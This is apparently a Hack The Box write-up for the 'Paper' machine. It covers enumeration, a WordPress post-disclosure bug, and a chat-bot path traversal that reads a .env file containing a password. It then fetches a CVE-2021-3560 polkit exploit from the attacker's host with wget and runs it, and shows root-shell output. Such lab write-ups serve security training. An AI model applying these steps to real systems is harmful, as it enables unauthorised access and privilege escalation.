
# By vishok paper
# htb writeup
####
####
####
## Open ports in target machine
### Nmap:
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
####
####
####
## Services that are running in the target machine
### HTTP:
Although we have two *HTTP* services, the nmap scan not reported us a especific domain that we could add to our `/etc/hosts`. So if we use directly the ip target machine in the browser: http://10.10.11.143 and https://10.10.11.143, we achieve see the same content, is the same web application. 
####
The content look static, we can try to enumerate directories and potencial files using tools like: [*gobuster*, *wfuzz*, *feroxbuster*, *fuff*]. I prefer use **wfuzz** beacuse allow us craft more complex filters.
####
```bash
wfuzz -c -u 'http://10.10.11.143/FUZZ' -w /usr/share/wordlists/dictionary/web-content/directory-list-lowercase-2.3-medium.txt -t 200 --hc 404 --hh 9164
```
####
The enumarate proccess report us many incorrect information, information that posses **9174** lenght caracters and return a **404** error code. For that reason is necessary cover them in the filter.
####
| Wfuzz Param | Description |
| ----- | ----- |
| -c | Represent the result with colors |
| -u | Especify the url to enumerate |
| -w | Especify the dicctionary to use |
| -t | Especify how much tasks must used |
| --hc | [*Hide Code*] Hide results that have a specifique status code |
| --hh | [*Hide Character*] Hide results that have a specifique lenght characters |
####
The enumerate process report us on unique directory: `/manual`, perfom a deep explorin into this directory, see the information in the browser and making more enumeration scan aginst this directory we can't achieve see something intersting.
####
####
####
### Apache:
How the web application no posses a visual version of the *CMS* or service that is running, we can try to enumerate the version of the service or CMS that is running using tools like: [*whatweb*, *wapallyzer*, *curl*]. Whatweb is our best option, because allow us to enumerate the version of the service or CMS that is running. At the moment to execute this command we can achieve the next information:
####
```rust
whatweb 10.10.11.143
http://10.10.11.143/ [403 Forbidden] 
Apache[2.4.37][mod_fcgid/2.3.9], 
Country[RESERVED][ZZ],
Email[webmaster@example.com], 
HTML5, 
HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], 
IP[10.10.11.143], 
MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28],
OpenSSL[1.1.1k], 
PoweredBy[CentOS], 
Title[HTTP Server Test Page powered by CentOS], 
UncommonHeaders[x-backend-server], 
X-Backend[office.paper]
```
####
**office.paper**, this is a domain, we already a doimain to add in our `/etc/hosts`.
####
<div class="warning">

> This information is only reported using the HTTP, **HTTPS** not work.
</div>

####
Looking the content of the domain tha we discovered, we see a login panel, but without valid credentials, we can't sign in into it. Also we don't have a version for the wordpress blog, previusly we achieve get information using **whatweb**. So running a new command we get a wordpress version: [*Wordpress 5.2.3*]. Having a valid version is only looking for a posible exploit in github or exploit-db. 
####
Exist one article that explain a vulnerability in wordpress 5.2.3, the article is: [Article-PoC](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/)
####
<div class="info">

> The **static=1** part typically acts as a flag or switch in the code to enable or select the use of a static buffer or a particular processing mode that uses a fixed-size buffer. The value 1 usually means true or enabled.
</p>
</div>

#### 
The article say tha if we use `?static=1` after the url lik: http://office.paper?static=1 we sould can see the secret content. So if we add this parameter to the url we can see the secret content:
####
```rust
Secret Registration URL of new Employee chat system
http://chat.office.paper/register/8qozr226AhkCHZdyY
```
####
Well, we discoved a subdomain: **chat.office.paper**. We must to incorporate this subdomain in the `/etc/hosts`. And aim against this subdomain. The sign up panel, ask for a username, email and password. We can try to register a new user.
####
<div class="img">
    <img src="/machines/public/paper/1.png" loading="lazy" decoding="async" />
</div>

####
Well, **Rocket.chat** is very a web application very similar to Discord. Exist a only bot **recyclops**. If you start a new direct chat with this bot you can see that it function with commands. With command `help` a list the commands that we can use.
####
####
####
## First explotation phase
### Rocket.chat:
The most intersting command are: **list** and **file**, the first command seems be a `ls` command, and the second seems be a `cat` command. So we can asume that this web application present a posible [*Path Directory Traversal*]. If we pass to bot the next command: `list ../`, we achieve to see the directories and files of the **dwight** user. The `file` command don't allow us to read the user.txt flag and id_rsa, but in the home exist a diferrent directory: `hubot`.
####
<div class="img">
    <img src="/machines/public/paper/2.png" loading="lazy" decoding="async" />
</div>

####
```bash
1. list ../
2. list ../hubot 
```
####
Exist many files:
####
```bash
total 692
drwx------ 8   dwight dwight 4096   Sep 16 2021  .
drwx------ 11  dwight dwight 281    Feb 6  2022  ..
-rw-r--r-- 1   dwight dwight 0      Jul 3  2021  \
srwxr-xr-x 1   dwight dwight 0      Jul 3  2021  127.0.0.1:8000
srwxrwxr-x 1   dwight dwight 0      Jul 3  2021  127.0.0.1:8080
drwx--x--x 2   dwight dwight 36     Sep 16 2021  bin
-rw-r--r-- 1   dwight dwight 258    Sep 16 2021  .env
-rwxr-xr-x 1   dwight dwight 2      Jul 3  2021  external-scripts.json
drwx------ 8   dwight dwight 163    Jul 3  2021  .git
-rw-r--r-- 1   dwight dwight 917    Jul 3  2021  .gitignore
-rw-r--r-- 1   dwight dwight 491358 Apr 23 18:47 .hubot.log
-rwxr-xr-x 1   dwight dwight 1068   Jul 3  2021  LICENSE
drwxr-xr-x 89  dwight dwight 4096   Jul 3  2021  node_modules
drwx--x--x 115 dwight dwight 4096   Jul 3  2021  node_modules_bak
```
####
<div class="info">

> The **.env** file save the credentials, in something ocations this credentials are imported directly as environment variables.
</div>

####
We can read the **.env** file: `file ../hubot/.env` and we achieve to get the credentials:
####
```bash
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```
####
The *SSH* port is open so we could try to connect against target machine using: `ssh dwight@10.10.11.143`.
####
####
####
## Second exploit phase (Privilage Escalation)
### SUID files:
At review if the user form part of the sudoers file we can see that the user is not part of this file. Other aproximation is to search for *SUID* files and capabilities. To search for SUID files we can use the following command:
####
```bash
find / -perm -4000 -type f 2>/dev/null
```
####
| Find Param | Description |
| ----- | ----- |
| -perm | Especify the permissions of the files |
| -4000 | The 4000 number is the SUID bit [*S*] |
| -type f | Especify a search based in files not directories |
| 2>/dev/null | Hide the error, sending them to /dev/null |
####
The command report us the next information:
####
```python
/usr/bin/fusermount3
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1 -> Key lib with SUID permission
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/qemu-bridge-helper
```
####
<div class="info">

> Polkit is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for **non-privileged** processes to communicate with **privileged ones**.
</p>
</div>

####
Having that in mind, we can try to use the **polkit-agent-helper-1** file to escalate our permissions. But first we need to search what is the proccess and the arguments that are passed to exploit. [Poolkit-Privilage-Escalation](https://github.com/Almorabea/Polkit-exploit)
####
Is a python file, tha wait be executed in target machine, so first is necessary verify wether target machine have python: `which python3` and effectively exist. So we need to share this file with the target machine. Using python in this our machine:
####
```bash
git clone https://github.com/Almorabea/Polkit-exploit
cd Polkit-exploit
python3 -m http.server 8080
```
####
In the target machine:
####
```bash
wget http://<tun0_ip>:8080/CVE-2021-3560.py
python3 CVE-2021-3560.py
```
####
After execute the python exploit we should become in the **root** user, because the exploit automate all explotation, and execute de command: `su ahmed`, insert the password and then execute: `sudo su`, is in that moment tha we become in root user.
####
```perl
[+] Timed out at: 0.007162246574390269
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

bash: cannot set terminal process group (3013): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper dwight]# -> Spawned root shell
```